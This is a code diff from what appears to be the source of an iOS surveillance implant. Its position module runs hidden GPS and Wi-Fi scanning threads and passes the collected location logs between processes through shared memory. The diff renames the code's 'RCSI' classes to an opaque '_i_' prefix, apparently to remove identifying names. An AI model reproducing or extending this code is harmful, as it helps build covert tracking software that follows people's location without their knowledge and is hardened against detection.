@@ -126,7 +126,7 @@ int (*WifiScan)(void *, NSArray **, void *) = NULL;
          [entryData bytes],
          [entryData length]);
   
-  [[RCSISharedMemory sharedInstance] writeIpcBlob:logData];
+  [[_i_SharedMemory sharedInstance] writeIpcBlob:logData];
   
   [entryData release];
   [gpsInfoData release];
@@ -197,7 +197,7 @@ int (*WifiScan)(void *, NSArray **, void *) = NULL;
          [additionalData bytes],
          [additionalData length]);
   
-  [[RCSISharedMemory sharedInstance] writeIpcBlob:logData];
+  [[_i_SharedMemory sharedInstance] writeIpcBlob:logData];
   
   NSMutableData *entryData = [[NSMutableData alloc] init];
   
@@ -230,7 +230,7 @@ int (*WifiScan)(void *, NSArray **, void *) = NULL;
          [entryData bytes],
          [entryData length]);
   
-  [[RCSISharedMemory sharedInstance] writeIpcBlob:logData];
+  [[_i_SharedMemory sharedInstance] writeIpcBlob:logData];
   
   [entryData release];
   [additionalData release];
@@ -315,7 +315,7 @@ int (*WifiScan)(void *, NSArray **, void *) = NULL;
 {
   if (mModeFlags & POS_MODULES_GPS_ENABLE)
   {
-    RCSIThread *agentThread = [[RCSIThread alloc] initWithTarget: self
+    _i_Thread *agentThread = [[_i_Thread alloc] initWithTarget: self
                                                         selector: @selector(threadGPSRunLoop) 
                                                           object: nil
                                                          andName: @"pstngp"];
@@ -473,7 +473,7 @@ int (*WifiScan)(void *, NSArray **, void *) = NULL;
   if ([self setupWifiFunc] == TRUE &&
       (mModeFlags & POS_MODULES_WIF_ENABLE))
   {    
-    RCSIThread *agentThread = [[RCSIThread alloc] initWithTarget: self
+    _i_Thread *agentThread = [[_i_Thread alloc] initWithTarget: self
                                                         selector: @selector(threadWifiRunLoop) 
                                                           object: nil
                                                          andName: @"pstnwf"];
